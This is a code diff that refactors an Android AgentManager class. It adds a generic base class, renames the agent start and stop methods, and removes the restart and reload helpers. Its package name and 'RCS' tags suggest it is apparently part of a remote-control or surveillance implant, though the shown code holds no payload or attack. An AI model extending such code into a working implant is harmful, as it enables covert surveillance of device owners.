@@ -19,7 +19,7 @@ import com.ht.RCSAndroidGUI.utils.Check;
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager {
+public class AgentManager extends Manager<AgentBase> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager";
@@ -27,12 +27,6 @@ public class AgentManager extends Manager {
 	/** The singleton. */
 	private volatile static AgentManager singleton;
 
-	/** The status obj. */
-	private final Status statusObj;
-
-	/** The running. */
-	private final HashMap<Integer, AgentBase> running;
-	private final HashMap<AgentBase, Thread> threads;
 
 	/**
 	 * Self.
@@ -49,16 +43,6 @@ public class AgentManager extends Manager {
 		}
 
 		return singleton;
-	}
-
-	/**
-	 * Instantiates a new agent manager.
-	 */
-	private AgentManager() {
-		statusObj = Status.self();
-
-		running = new HashMap<Integer, AgentBase>();
-		threads = new HashMap<AgentBase, Thread>();
 	}
 
 	/**
@@ -146,9 +130,9 @@ public class AgentManager extends Manager {
 	 * 
 	 * @return true, if successful
 	 */
-	public boolean startAgents() {
+	public boolean startAll() {
 		HashMap<Integer, AgentConf> agents;
-		agents = statusObj.getAgentsMap();
+		agents = status.getAgentsMap();
 
 		if (agents == null) {
 			Log.d("RCS", "Agents map null");
@@ -164,7 +148,7 @@ public class AgentManager extends Manager {
 
 		while (it.hasNext()) {
 			final Integer key = it.next();
-			startAgent(key);
+			 start(key);
 		}
 
 		return true;
@@ -174,14 +158,14 @@ public class AgentManager extends Manager {
 	/**
 	 * Stop agents.
 	 */
-	public void stopAgents() {
+	public void stopAll() {
 		HashMap<Integer, AgentConf> agents;
-		agents = statusObj.getAgentsMap();
+		agents = status.getAgentsMap();
 		final Iterator<Integer> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
 			final Integer key = it.next();
-			stopAgent(key);
+			stop(key);
 		}
 	}
 
@@ -191,10 +175,10 @@ public class AgentManager extends Manager {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void startAgent(final int key) {
+	public synchronized void start(final int key) {
 		HashMap<Integer, AgentConf> agents;
 
-		agents = statusObj.getAgentsMap();
+		agents = status.getAgentsMap();
 
 		if (agents == null) {
 			Log.d("RCS", "Agents map null");
@@ -242,7 +226,7 @@ public class AgentManager extends Manager {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void stopAgent(final int key) {
+	public synchronized void stop(final int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
 			Log.d("RCS", "Agent " + key + " not present");
@@ -263,30 +247,10 @@ public class AgentManager extends Manager {
 		threads.remove(a);
 	}
 
-	/**
-	 * Restart agent.
-	 * 
-	 * @param key
-	 *            the key
-	 */
-	public synchronized void restartAgent(final int key) {
-		final AgentBase a = running.get(key);
-		stopAgent(key);
-		startAgent(key);
-	}
 
-	/**
-	 * Reload agent.
-	 * 
-	 * @param key
-	 *            the key
-	 */
-	public void reloadAgent(final int key) {
-		final AgentBase a = running.get(key);
-		a.next();
-	}
 
-	public HashMap<Integer, AgentBase> getRunningAgents() {
-		return running;
-	}
+
+
+
+
 }
